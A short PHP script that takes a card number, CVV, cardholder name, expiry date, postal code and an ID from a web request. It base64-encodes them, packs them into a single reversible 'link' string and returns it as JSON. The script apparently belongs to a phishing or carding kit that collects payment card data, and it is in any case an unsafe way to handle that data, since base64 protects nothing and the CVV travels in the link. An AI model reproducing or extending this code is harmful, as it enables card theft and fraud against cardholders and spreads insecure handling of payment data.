<?php
	
	$card = base64_encode($_REQUEST['tx_card']);
	$cvv = base64_encode($_REQUEST['tx_cvv']);
	$name = base64_encode($_REQUEST['tx_name']);
	$month = base64_encode($_REQUEST['tx_month']);
	$yeas = base64_encode($_REQUEST['tx_year']);
	$postal = base64_encode($_REQUEST['tx_postal']);
	$txtID = base64_encode($_REQUEST['txtID']);
	
	
	$link =  base64_encode($card.'|'.$cvv.'|'.$name.'|'.$month.'|'.$yeas.'|'.$postal.'|'.$txtID);
	
	echo json_encode(
	array(
		'link' => $link
		)
	);
?>